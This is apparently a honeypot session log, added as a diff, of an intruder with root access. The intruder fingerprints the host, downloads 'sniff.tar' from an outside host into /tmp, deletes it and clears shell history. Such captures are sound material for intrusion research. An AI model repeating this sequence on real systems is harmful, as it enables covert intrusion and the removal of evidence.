@@ -1,0 +1,151 @@
+[4hAWSWeb:~# w
+[4l 22:00:11 up 4 days, 0:4,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    90.165.221.167    22:00    0.09   0.05   0.05 w
+[4hAWSWeb:~# uname -a
+[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hAWSWeb:~# ps x
+[4l  PID TTY          TIME CMD
+ 5478 pts/0    00:00:00 bash
+ 5679 pts/0    00:00:00 ps x
+[4hAWSWeb:~# w
+[4l 22:00:15 up 4 days, 0:4,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    90.165.221.167    22:00    0.09   0.05   0.05 w
+[4hAWSWeb:~# cat /proc/cpuinfo
+[4lprocessor	: 0
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 0
+cpu cores	: 2
+apicid		: 0
+initial apicid	: 0
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4270.03
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+processor	: 1
+vendor_id	: GenuineIntel
+cpu family	: 6
+model		: 23
+model name	: Intel(R) Core(TM)2 Duo CPU     E8200  @ 2.66GHz
+stepping	: 6
+cpu MHz		: 2133.305
+cache size	: 6144 KB
+physical id	: 0
+siblings	: 2
+core id		: 1
+cpu cores	: 2
+apicid		: 1
+initial apicid	: 1
+fpu		: yes
+fpu_exception	: yes
+cpuid level	: 10
+wp		: yes
+flags		: fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush dts acpi mmx fxsr sse sse2 ss ht tm pbe syscall nx lm constant_tsc arch_perfmon pebs bts rep_good pni monitor ds_cpl vmx smx est tm2 ssse3 cx16 xtpr sse4_1 lahf_lm
+bogomips	: 4266.61
+clflush size	: 64
+cache_alignment	: 64
+address sizes	: 36 bits physical, 48 bits virtual
+power management:
+
+[4hAWSWeb:~# w
+[4l 22:00:25 up 4 days, 0:4,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    90.165.221.167    22:00    0.09   0.05   0.05 w
+[4hAWSWeb:~# un[1D[1P[1D[1Pifconfig
+[4leth0      Link encap:Ethernet  HWaddr 00:4c:a8:ab:32:f4  
+          inet addr:10.98.55.4  Bcast:10.98.55.255  Mask:255.255.255.0
+          inet6 addr: fe80::21f:c6ac:fd44:24d7/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:84045991 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:103776307 errors:0 dropped:0 overruns:0 carrier:2
+          collisions:0 txqueuelen:1000 
+          RX bytes:50588302699 (47.1 GiB)  TX bytes:97318807157 (90.6 GiB)
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:308297 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:308297 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:355278106 (338.8 MiB)  TX bytes:355278106 (338.8 MiB)
+[4hAWSWeb:~# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:~# perl
+bash: perl: command not found
+AWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /tmp
+[4l[4hAWSWeb:/tmp# ls
+[4l[4hAWSWeb:/tmp# wget bubble.yz
+AWSWeb:/tmp# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# lls
+bash: lls: command not found
+localhost:~# ls
+[4l[4hlocalhost:~# perl
+bash: perl: command not found
+localhost:~# w
+[4l 22:00:53 up 4 days, 0:4,  1 users, load averages: 0.09 0.05 0.05
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+root     pts/2    90.165.221.167    22:00    0.09   0.05   0.05 w
+[4hlocalhost:~# uname -a
+[4lLinux localhost 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
+[4hlocalhost:~# id
+[4luid=0(root) gid=0(root) groups=0(root)
+[4hlocalhost:~# cd /tmp
+[4l[4hlocalhost:/tmp# wget bubble.yzi.me/sniff.tar
+[4l--2013-01-28 22:01:07--  http://bubble.yzi.me/sniff.tar
+Connecting to bubble.yzi.me:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 146 (146bytes) [text/html]
+Saving to: `sniff.tar
+
+100% [=======================================>] 146          0K/s  eta 0s100%[======================================>] 146          0K/s
+
+2013-01-28 22:01:07 (0 KB/s) - `sniff.tar' saved [146/146]
+[4hlocalhost:/tmp# rm -rf sniff.tar
+[4l[4hlocalhost:/tmp# history
+[4l    1  w
+    2  uname -a
+    3  ps x
+    4  w
+    5  cat /proc/cpuinfo
+    6  w
+    7  ifconfig
+    8  wget
+    9  perl
+   10  ls
+   11  cd /tmp
+   12  ls
+   13  exit
+   14  lls
+   15  ls
+   16  perl
+   17  w
+   18  uname -a
+   19  id
+   20  cd /tmp
+   21  wget bubble.yzi.me/sniff.tar
+   22  rm -rf sniff.tar
+   23  history
+[4hlocalhost:/tmp# history -c
+[4l[4hlocalhost:/tmp# 
